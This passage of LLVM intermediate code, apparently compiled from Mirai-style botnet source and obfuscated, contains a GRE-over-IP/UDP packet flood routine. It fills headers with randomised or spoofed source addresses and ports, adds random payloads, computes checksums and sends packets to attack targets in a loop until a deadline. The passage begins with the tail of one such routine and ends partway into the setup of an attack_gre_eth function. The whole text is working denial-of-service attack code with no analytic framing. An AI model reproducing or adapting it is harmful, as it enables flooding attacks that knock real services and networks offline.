  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #6
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* %12, align 4
  %97 = call i32 @close(i32 %96)
  br label %554

; <label>:98:                                     ; preds = %90
  store i32 0, i32* %11, align 4
  br label %99

; <label>:99:                                     ; preds = %312, %98
  %100 = load i32, i32* %11, align 4
  %101 = load i8, i8* %7, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %318

; <label>:104:                                    ; preds = %99
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %13, align 8
  %107 = load i32, i32* %11, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %13, align 8
  %111 = load i32, i32* %11, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %26, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %27, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %28, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 %127, -1
  %129 = xor i8 15, -1
  %130 = xor i8 24, -1
  %131 = or i8 %128, %129
  %132 = or i8 24, %130
  %133 = xor i8 %131, -1
  %134 = and i8 %133, %132
  %135 = and i8 %127, 15
  %136 = and i8 %134, 64
  %137 = xor i8 %134, 64
  %138 = or i8 %136, %137
  %139 = or i8 %134, 64
  store i8 %138, i8* %126, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %141 = bitcast %struct.iphdr* %140 to i8*
  %142 = load i8, i8* %141, align 4
  %143 = xor i8 -16, -1
  %144 = xor i8 %142, %143
  %145 = and i8 %144, %142
  %146 = and i8 %142, -16
  %147 = and i8 %145, 5
  %148 = xor i8 %145, 5
  %149 = or i8 %147, %148
  %150 = or i8 %145, 5
  store i8 %149, i8* %141, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %20, align 4
  %155 = sext i32 %154 to i64
  %156 = sub i64 0, 52
  %157 = sub i64 0, %155
  %158 = add i64 %156, %157
  %159 = sub i64 0, %158
  %160 = add i64 52, %155
  %161 = trunc i64 %159 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 2
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %15, align 2
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 3
  store i16 %166, i16* %168, align 4
  %169 = load i8, i8* %16, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 5
  store i8 %169, i8* %171, align 4
  %172 = load i8, i8* %17, align 1
  %173 = icmp ne i8 %172, 0
  br i1 %173, label %174, label %178

; <label>:174:                                    ; preds = %104
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %174, %104
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 47, i8* %180, align 1
  %181 = load i32, i32* %23, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %193 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %194 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %196 = bitcast %struct.iphdr* %195 to i8*
  %197 = load i8, i8* %196, align 4
  %198 = xor i8 %197, -1
  %199 = xor i8 15, -1
  %200 = xor i8 20, -1
  %201 = or i8 %198, %199
  %202 = or i8 20, %200
  %203 = xor i8 %201, -1
  %204 = and i8 %203, %202
  %205 = and i8 %197, 15
  %206 = and i8 %204, 64
  %207 = xor i8 %204, 64
  %208 = or i8 %206, %207
  %209 = or i8 %204, 64
  store i8 %208, i8* %196, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %211 = bitcast %struct.iphdr* %210 to i8*
  %212 = load i8, i8* %211, align 4
  %213 = xor i8 %212, -1
  %214 = xor i8 -16, -1
  %215 = xor i8 -1, -1
  %216 = or i8 %213, %214
  %217 = or i8 -1, %215
  %218 = xor i8 %216, -1
  %219 = and i8 %218, %217
  %220 = and i8 %212, -16
  %221 = and i8 %219, 5
  %222 = xor i8 %219, 5
  %223 = or i8 %221, %222
  %224 = or i8 %219, 5
  store i8 %223, i8* %211, align 4
  %225 = load i8, i8* %14, align 1
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 1
  store i8 %225, i8* %227, align 1
  %228 = load i32, i32* %20, align 4
  %229 = sext i32 %228 to i64
  %230 = sub i64 0, %229
  %231 = sub i64 28, %230
  %232 = add i64 28, %229
  %233 = trunc i64 %231 to i16
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 2
  store i16 %234, i16* %236, align 2
  %237 = load i16, i16* %15, align 2
  %238 = zext i16 %237 to i32
  %239 = xor i32 %238, -1
  %240 = and i32 -1, %239
  %241 = xor i32 -1, -1
  %242 = and i32 %238, %241
  %243 = or i32 %240, %242
  %244 = xor i32 %238, -1
  %245 = trunc i32 %243 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 3
  store i16 %246, i16* %248, align 4
  %249 = load i8, i8* %16, align 1
  %250 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 5
  store i8 %249, i8* %251, align 4
  %252 = load i8, i8* %17, align 1
  %253 = icmp ne i8 %252, 0
  br i1 %253, label %254, label %258

; <label>:254:                                    ; preds = %178
  %255 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 4
  store i16 %255, i16* %257, align 2
  br label %258

; <label>:258:                                    ; preds = %254, %178
  %259 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 6
  store i8 17, i8* %260, align 1
  %261 = call i32 @rand_next()
  %262 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 8
  store i32 %261, i32* %263, align 4
  %264 = load i8, i8* %22, align 1
  %265 = icmp ne i8 %264, 0
  br i1 %265, label %266, label %272

; <label>:266:                                    ; preds = %258
  %267 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 9
  %269 = load i32, i32* %268, align 4
  %270 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 9
  store i32 %269, i32* %271, align 4
  br label %292

; <label>:272:                                    ; preds = %258
  %273 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 8
  %275 = load i32, i32* %274, align 4
  %276 = sub i32 0, 1024
  %277 = add i32 %275, %276
  %278 = sub i32 %275, 1024
  %279 = xor i32 %277, -1
  %280 = and i32 1014663946, %279
  %281 = xor i32 1014663946, -1
  %282 = and i32 %277, %281
  %283 = xor i32 -1, -1
  %284 = and i32 %283, 1014663946
  %285 = and i32 -1, %281
  %286 = or i32 %280, %282
  %287 = or i32 %284, %285
  %288 = xor i32 %286, %287
  %289 = xor i32 %277, -1
  %290 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %288, i32* %291, align 4
  br label %292

; <label>:292:                                    ; preds = %272, %266
  %293 = load i16, i16* %18, align 2
  %294 = call zeroext i16 @htons(i16 zeroext %293) #7
  %295 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 0
  store i16 %294, i16* %296, align 2
  %297 = load i16, i16* %19, align 2
  %298 = call zeroext i16 @htons(i16 zeroext %297) #7
  %299 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 1
  store i16 %298, i16* %300, align 2
  %301 = load i32, i32* %20, align 4
  %302 = sext i32 %301 to i64
  %303 = sub i64 0, 8
  %304 = sub i64 0, %302
  %305 = add i64 %303, %304
  %306 = sub i64 0, %305
  %307 = add i64 8, %302
  %308 = trunc i64 %306 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #7
  %310 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 2
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %292
  %313 = load i32, i32* %11, align 4
  %314 = add i32 %313, -858088998
  %315 = add i32 %314, 1
  %316 = sub i32 %315, -858088998
  %317 = add nsw i32 %313, 1
  store i32 %316, i32* %11, align 4
  br label %99

; <label>:318:                                    ; preds = %99
  br label %319

; <label>:319:                                    ; preds = %553, %318
  store i32 0, i32* %11, align 4
  br label %320

; <label>:320:                                    ; preds = %540, %319
  %321 = load i32, i32* %11, align 4
  %322 = load i8, i8* %7, align 1
  %323 = zext i8 %322 to i32
  %324 = icmp slt i32 %321, %323
  br i1 %324, label %325, label %547

; <label>:325:                                    ; preds = %320
  %326 = load i8**, i8*** %13, align 8
  %327 = load i32, i32* %11, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds i8*, i8** %326, i64 %328
  %330 = load i8*, i8** %329, align 8
  store i8* %330, i8** %29, align 8
  %331 = load i8*, i8** %29, align 8
  %332 = bitcast i8* %331 to %struct.iphdr*
  store %struct.iphdr* %332, %struct.iphdr** %30, align 8
  %333 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i64 1
  %335 = bitcast %struct.iphdr* %334 to %struct.grehdr*
  store %struct.grehdr* %335, %struct.grehdr** %31, align 8
  %336 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %337 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %336, i64 1
  %338 = bitcast %struct.grehdr* %337 to %struct.iphdr*
  store %struct.iphdr* %338, %struct.iphdr** %32, align 8
  %339 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i64 1
  %341 = bitcast %struct.iphdr* %340 to %struct.udphdr*
  store %struct.udphdr* %341, %struct.udphdr** %33, align 8
  %342 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i64 1
  %344 = bitcast %struct.udphdr* %343 to i8*
  store i8* %344, i8** %34, align 8
  %345 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %346 = load i32, i32* %11, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %345, i64 %347
  %349 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %348, i32 0, i32 2
  %350 = load i8, i8* %349, align 4
  %351 = zext i8 %350 to i32
  %352 = icmp slt i32 %351, 32
  br i1 %352, label %353, label %376

; <label>:353:                                    ; preds = %325
  %354 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %355 = load i32, i32* %11, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 1
  %359 = load i32, i32* %358, align 4
  %360 = call i32 @ntohl(i32 %359) #7
  %361 = call i32 @rand_next()
  %362 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 2
  %367 = load i8, i8* %366, align 4
  %368 = zext i8 %367 to i32
  %369 = lshr i32 %361, %368
  %370 = sub i32 0, %369
  %371 = sub i32 %360, %370
  %372 = add i32 %360, %369
  %373 = call i32 @htonl(i32 %371) #7
  %374 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i32 0, i32 9
  store i32 %373, i32* %375, align 4
  br label %376

; <label>:376:                                    ; preds = %353, %325
  %377 = load i32, i32* %23, align 4
  %378 = icmp eq i32 %377, -1
  br i1 %378, label %379, label %383

; <label>:379:                                    ; preds = %376
  %380 = call i32 @rand_next()
  %381 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 8
  store i32 %380, i32* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %379, %376
  %384 = load i16, i16* %15, align 2
  %385 = zext i16 %384 to i32
  %386 = icmp eq i32 %385, 65535
  br i1 %386, label %387, label %413

; <label>:387:                                    ; preds = %383
  %388 = call i32 @rand_next()
  %389 = xor i32 65535, -1
  %390 = xor i32 %388, %389
  %391 = and i32 %390, %388
  %392 = and i32 %388, 65535
  %393 = trunc i32 %391 to i16
  %394 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 3
  store i16 %393, i16* %395, align 4
  %396 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 3
  %398 = load i16, i16* %397, align 4
  %399 = zext i16 %398 to i32
  %400 = sub i32 %399, -1200412140
  %401 = sub i32 %400, 1000
  %402 = add i32 %401, -1200412140
  %403 = sub nsw i32 %399, 1000
  %404 = xor i32 %402, -1
  %405 = and i32 -1, %404
  %406 = xor i32 -1, -1
  %407 = and i32 %402, %406
  %408 = or i32 %405, %407
  %409 = xor i32 %402, -1
  %410 = trunc i32 %408 to i16
  %411 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 3
  store i16 %410, i16* %412, align 4
  br label %413

; <label>:413:                                    ; preds = %387, %383
  %414 = load i16, i16* %18, align 2
  %415 = zext i16 %414 to i32
  %416 = icmp eq i32 %415, 65535
  br i1 %416, label %417, label %430

; <label>:417:                                    ; preds = %413
  %418 = call i32 @rand_next()
  %419 = xor i32 %418, -1
  %420 = xor i32 65535, -1
  %421 = xor i32 -350247830, -1
  %422 = or i32 %419, %420
  %423 = or i32 -350247830, %421
  %424 = xor i32 %422, -1
  %425 = and i32 %424, %423
  %426 = and i32 %418, 65535
  %427 = trunc i32 %425 to i16
  %428 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 0
  store i16 %427, i16* %429, align 2
  br label %430

; <label>:430:                                    ; preds = %417, %413
  %431 = load i16, i16* %19, align 2
  %432 = zext i16 %431 to i32
  %433 = icmp eq i32 %432, 65535
  br i1 %433, label %434, label %443

; <label>:434:                                    ; preds = %430
  %435 = call i32 @rand_next()
  %436 = xor i32 65535, -1
  %437 = xor i32 %435, %436
  %438 = and i32 %437, %435
  %439 = and i32 %435, 65535
  %440 = trunc i32 %438 to i16
  %441 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 1
  store i16 %440, i16* %442, align 2
  br label %443

; <label>:443:                                    ; preds = %434, %430
  %444 = load i8, i8* %22, align 1
  %445 = icmp ne i8 %444, 0
  br i1 %445, label %450, label %446

; <label>:446:                                    ; preds = %443
  %447 = call i32 @rand_next()
  %448 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 9
  store i32 %447, i32* %449, align 4
  br label %456

; <label>:450:                                    ; preds = %443
  %451 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 9
  store i32 %453, i32* %455, align 4
  br label %456

; <label>:456:                                    ; preds = %450, %446
  %457 = load i8, i8* %21, align 1
  %458 = icmp ne i8 %457, 0
  br i1 %458, label %459, label %466

; <label>:459:                                    ; preds = %456
  %460 = load i8*, i8** %34, align 8
  %461 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %460, i32 %461)
  %462 = load i8*, i8** %34, align 8
  %463 = load i32, i32* %20, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds i8, i8* %462, i64 %464
  store i8 0, i8* %465, align 1
  br label %466

; <label>:466:                                    ; preds = %459, %456
  %467 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 7
  store i16 0, i16* %468, align 2
  %469 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %470 = bitcast %struct.iphdr* %469 to i16*
  %471 = call zeroext i16 @checksum_generic(i16* %470, i32 20)
  %472 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 7
  store i16 %471, i16* %473, align 2
  %474 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 7
  store i16 0, i16* %475, align 2
  %476 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %477 = bitcast %struct.iphdr* %476 to i16*
  %478 = call zeroext i16 @checksum_generic(i16* %477, i32 20)
  %479 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 7
  store i16 %478, i16* %480, align 2
  %481 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 3
  store i16 0, i16* %482, align 2
  %483 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %484 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %485 = bitcast %struct.udphdr* %484 to i8*
  %486 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %487 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %486, i32 0, i32 2
  %488 = load i16, i16* %487, align 2
  %489 = load i32, i32* %20, align 4
  %490 = sext i32 %489 to i64
  %491 = sub i64 0, 8
  %492 = sub i64 0, %490
  %493 = add i64 %491, %492
  %494 = sub i64 0, %493
  %495 = add i64 8, %490
  %496 = trunc i64 %494 to i32
  %497 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %483, i8* %485, i16 zeroext %488, i32 %496)
  %498 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %499 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %498, i32 0, i32 3
  store i16 %497, i16* %499, align 2
  %500 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %501 = load i32, i32* %11, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %500, i64 %502
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i32 0, i32 0
  %505 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %504, i32 0, i32 0
  store i16 2, i16* %505, align 4
  %506 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 9
  %508 = load i32, i32* %507, align 4
  %509 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %510 = load i32, i32* %11, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i64 %511
  %513 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i32 0, i32 0
  %514 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %513, i32 0, i32 2
  %515 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %514, i32 0, i32 0
  store i32 %508, i32* %515, align 4
  %516 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %517 = load i32, i32* %11, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i64 %518
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %519, i32 0, i32 0
  %521 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %520, i32 0, i32 1
  store i16 0, i16* %521, align 2
  %522 = load i32, i32* %12, align 4
  %523 = load i8*, i8** %29, align 8
  %524 = load i32, i32* %20, align 4
  %525 = sext i32 %524 to i64
  %526 = sub i64 52, -7388275499438045516
  %527 = add i64 %526, %525
  %528 = add i64 %527, -7388275499438045516
  %529 = add i64 52, %525
  %530 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %531 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %532 = load i32, i32* %11, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %531, i64 %533
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i32 0, i32 0
  %536 = bitcast %struct.sockaddr_in* %535 to %struct.sockaddr*
  store %struct.sockaddr* %536, %struct.sockaddr** %530, align 8
  %537 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %538 = load %struct.sockaddr*, %struct.sockaddr** %537, align 8
  %539 = call i64 @sendto(i32 %522, i8* %523, i64 %528, i32 16384, %struct.sockaddr* %538, i32 16)
  br label %540

; <label>:540:                                    ; preds = %466
  %541 = load i32, i32* %11, align 4
  %542 = sub i32 0, %541
  %543 = sub i32 0, 1
  %544 = add i32 %542, %543
  %545 = sub i32 0, %544
  %546 = add nsw i32 %541, 1
  store i32 %545, i32* %11, align 4
  br label %320

; <label>:547:                                    ; preds = %320
  %548 = call i64 @time(i64* null) #6
  %549 = load i32, i32* %24, align 4
  %550 = sext i32 %549 to i64
  %551 = icmp sgt i64 %548, %550
  br i1 %551, label %552, label %553

; <label>:552:                                    ; preds = %547
  br label %554

; <label>:553:                                    ; preds = %547
  br label %319

; <label>:554:                                    ; preds = %552, %95, %89
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
